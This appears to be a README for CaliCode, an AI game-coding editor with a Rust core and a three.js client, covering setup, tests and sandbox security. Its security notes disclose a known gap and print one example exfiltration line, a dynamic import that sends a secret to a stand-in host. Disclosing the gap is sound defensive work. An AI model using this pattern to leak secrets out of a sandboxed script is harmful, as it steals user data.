# CaliCode

CaliCode is a native AI game-coding harness for the web. A Rust control plane
pairs with a three.js editor: asset workbench, asset library, Play-In-Editor
(PIE) runtime, deterministic frame capture, scripted tests, and an agent panel
that drives the editor through real tool calls.

No MCP, no harness fork, and no generated Three.js code — image-to-3D
reconstruction is a Rust pipeline that emits a data-driven `.cali` asset.

## Two ways to work

**Projects** are scene documents CaliCode owns end to end, stored under
`~/.cali/projects/<slug>`. The PLAY tab runs them in the PIE viewport.

**Workspaces** are folders on disk that CaliCode edits *in place* — your own
repository, unchanged. CaliCode browses the file tree, reads and writes real
files, and runs the project's own dev server in the PLAY tab. Open one with
**OPEN FOLDER** in the sidebar; it needs a `package.json` or a `.git`.

|                | Project              | Workspace                     |
| -------------- | -------------------- | ----------------------------- |
| Lives at       | `~/.cali/projects`   | anywhere                      |
| Owned by       | CaliCode             | you                           |
| Content        | scene JSON           | real source files             |
| PLAY renders   | the PIE viewport     | the workspace's own dev server |

## Layout

- `core/` — Rust JSON-RPC service: model gateway, project store, workspaces,
  dev-server supervisor, checkpoints, assets, baselines, image-to-3D, agent loop.
- `client/` — Vite + React + TypeScript three.js editor.

## Run

```bash
./scripts/dev.sh
```

The Rust core listens on `http://127.0.0.1:8765`; Vite serves the editor on
`http://127.0.0.1:5199` and proxies `/rpc` and `/events` to core. Workspace dev
servers get a port in `5300–5399`.

## Tests

```bash
cd core && cargo test
cd client && pnpm test
cd client && pnpm test:e2e
```

The e2e suite needs core running. Three specs exercise a live model provider
and will fail without one configured.

## Security notes

The RPC surface is unauthenticated and loopback-only. CORS is restricted to the
dev-server and core origins; extend it with `CALI_ALLOWED_ORIGINS` if you serve
the client from somewhere else. Do not expose port 8765 beyond localhost.

Workspace file access is confined to the workspace root by a canonicalizing
resolver, refuses `.env` / key material, and never executes an arbitrary
command — `devserver_start` takes a script *name* that must already exist in
the target's `package.json`.

Project scripts run in a sandboxed Worker with `fetch`, `XMLHttpRequest`,
`WebSocket`, `postMessage` and friends deleted along the whole prototype
chain, so a script from an untrusted project cannot reach the RPC surface.

**Known gap:** dynamic `import()` is syntax rather than a property, so it
cannot be removed this way — `import("http://host/?" + secret)` remains a GET
exfiltration path. Closing it needs a CSP (`connect-src 'none'`) on the
sandbox realm, which a plain Worker cannot carry; it requires hosting the
sandbox in a sandboxed iframe. Scripts see plain
vectors and return a transform patch; they never touch three.js objects
directly. A step that runs longer than 2s terminates the worker.

Scripted tests run in their own sandboxed Worker. They genuinely need
main-thread capabilities — stepping PIE, comparing baselines through core — so
the worker calls back over a request/response channel rather than being handed
those objects; it never holds a reference to anything real. `entityFor` stays
synchronous, served from a scene snapshot refreshed on every host reply. A
test that exceeds its timeout has its worker terminated.

Workspaces you attach are recorded in `~/.cali/config.yaml` and re-opened at
startup. Only the path is stored, so a custom label is not preserved.
